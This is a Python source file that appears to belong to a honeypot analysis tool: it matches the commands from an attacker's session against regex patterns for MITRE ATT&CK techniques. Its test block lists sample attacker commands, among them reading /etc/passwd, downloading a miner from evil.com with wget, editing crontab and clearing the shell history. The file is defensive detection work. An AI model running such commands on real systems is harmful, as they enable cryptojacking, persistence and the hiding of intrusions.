# Author: TK
# Date: 10-06-2026
# Purpose: Takes session's commands and produces a list of MITRE ATT&CK     techniques the attacker used.

import json
import re

from config import ATTACK_PATTERNS_FILE


class AttackClassifier:
    def __init__(self):
        with open(ATTACK_PATTERNS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)

        self.patterns = data.get("patterns", [])

        for pattern in self.patterns:
            regexes = pattern.get("regex") or [
                re.escape(match) for match in pattern.get("matches", [])
            ]

            pattern["_compiled"] = [
                re.compile(regex, re.IGNORECASE) for regex in regexes
            ]

    def classify_command(self, command: str) -> list[dict]:
        """Return a list of ATT&CK techniques matched by a single command."""

        matches = []

        for pattern in self.patterns:
            if any(regex.search(command) for regex in pattern.get("_compiled", [])):
                matches.append(
                    {
                        "id": pattern.get("id"),
                        "name": pattern.get("name"),
                        "tactic": pattern.get("tactic"),
                        "description": pattern.get("description", ""),
                    }
                )

        return matches

    def classify_session(self, session: dict) -> dict:
        unique_techniques = {}
        tactic_counts = {}
        timeline = []

        for command in session.get("commands", []):
            matches = self.classify_command(command)

            timeline.append(
                {
                    "command": command,
                    "techniques": matches,
                }
            )

            for match in matches:
                unique_techniques[match["id"]] = match

                tactic = match.get("tactic", "Unknown")
                tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1

        return {
            "session_id": session.get("session_id"),
            "peer_ip": session.get("peer_ip"),
            "techniques": list(unique_techniques.values()),
            "tactic_counts": tactic_counts,
            "timeline": timeline,
            "technique_count": len(unique_techniques),
        }


if __name__ == "__main__":
    classifier = AttackClassifier()

    test_commands = [
        "whoami",
        "cat /etc/passwd",
        "wget http://evil.com/miner.sh",
        "chmod +x miner.sh",
        "crontab -e",
        "history -c",
    ]

    for command in test_commands:
        print(command, classifier.classify_command(command))

